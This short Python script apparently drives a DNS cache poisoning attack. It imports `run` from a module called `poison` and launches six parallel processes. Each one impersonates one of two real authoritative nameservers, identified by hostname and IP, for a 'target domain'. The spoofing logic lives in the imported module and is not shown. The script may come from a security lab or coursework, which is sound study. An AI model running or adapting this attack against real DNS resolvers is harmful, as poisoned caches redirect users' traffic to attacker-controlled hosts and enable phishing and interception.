import multiprocessing

from poison import run

if __name__ == '__main__':
    jobs = []
    offset_list = ['a', 'b', 'c', 'd', 'e', 'f']
    # Authoritative NS for the target domain
    known_ns_domain_1 = "ns01.cashparking.com."
    known_ns_ip_1 = "216.69.185.38"
    known_ns_domain_2 = "ns02.cashparking.com."
    known_ns_ip_2 = "208.109.255.38"
    ns_1 = (known_ns_domain_1, known_ns_ip_1)
    ns_2 = (known_ns_domain_2, known_ns_ip_2)
    ns_list = [ns_1, ns_1, ns_1, ns_2, ns_2, ns_2]
    try:
        for i in range(6):
            p = multiprocessing.Process(target=run, args=(offset_list[i], 200, ns_list[i][0], ns_list[i][1]))
            jobs.append(p)
            p.start()

    except KeyboardInterrupt:
        for j in jobs:
            j.terminate()
